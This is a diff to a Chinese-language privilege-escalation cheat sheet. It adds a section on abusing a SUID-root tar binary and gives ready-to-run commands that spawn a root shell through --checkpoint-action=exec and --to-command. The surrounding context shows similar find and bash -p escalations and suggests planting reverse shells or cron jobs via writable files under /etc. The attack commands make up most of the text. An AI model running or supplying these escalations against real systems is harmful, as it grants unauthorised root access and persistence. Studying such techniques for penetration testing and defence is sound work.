@@ -41,7 +41,65 @@ find . -exec /bin/sh -p \; -quit
 利用命令：
 bash -p
 
-五：其他可执行文件的一般suid二进制文件
+五：tar
+
+1. 前提条件
+
+    GNU tar（某些特性只在 GNU tar 可用）。
+
+    tar 二进制带 SUID root：可以是真正系统上的 tar，或你自己复制一份后用
+
+    sudo install -m=4755 $(which tar) /tmp/tar_suid
+
+    将其设为 root-owned 且带 SUID 位。
+    gtfobins.github.io
+
+    目标系统允许 tar 通过 --checkpoint-action 或 --to-command 调用外部命令。
+
+2. 方法一：❏ --checkpoint-action=exec
+
+--checkpoint 用于在处理完一定数量的记录后触发回调，配合 --checkpoint-action=exec=…，tar 会以自身的有效 UID（此时为 root）去执行指定命令。
+
+# 复制并设置 SUID（若系统 tar 已 SUID，可跳过）
+sudo install -m=4755 $(which tar) /tmp/tar_suid
+
+# 用法示例：立即触发一次 checkpoint，执行 /bin/sh
+/tmp/tar_suid \
+  -cf /dev/null /dev/null \
+  --checkpoint=1 \
+  --checkpoint-action=exec=/bin/sh
+
+    -c：创建档案，-f /dev/null 指定“空”档案；
+
+    --checkpoint=1：处理 1 个档案块后触发；
+
+    --checkpoint-action=exec=/bin/sh：以 root 身份执行交互式 shell。
+    执行后，你会直接获得一个 root shell。
+    gtfobins.github.io
+
+3. 方法二：❏ --to-command
+
+--to-command=CMD 会在解包每个文件时，将该文件内容通过管道传给指定命令，CMD 也以 tar 的有效 UID（root）运行。
+
+# 准备一个临时文件，让 tar 解包时把它传给 sh
+TF=$(mktemp)
+echo '/bin/sh 0<&1' > "$TF"
+tar cf "$TF.tar" "$TF"
+
+# 用 SUID tar 解压，触发 --to-command
+/tmp/tar_suid \
+  -xf "$TF.tar" \
+  --to-command=sh
+
+    mktemp 创建唯一文件名；
+
+    文件内容 '/bin/sh 0<&1' 会让 sh 从 tar 的 stdout/ stdin 绑定到你的终端；
+
+    -xf 解包时遇到该文件，就执行 sh，同样拿到 root shell。
+    gtfobins.github.io
+
+
+六：其他可执行文件的一般suid二进制文件
 
 若 SUID 程序能写入 /etc/cron.d/、/etc/profile.d/、~/.bashrc 等文件，就可插入反弹 shell 或定时任务
 
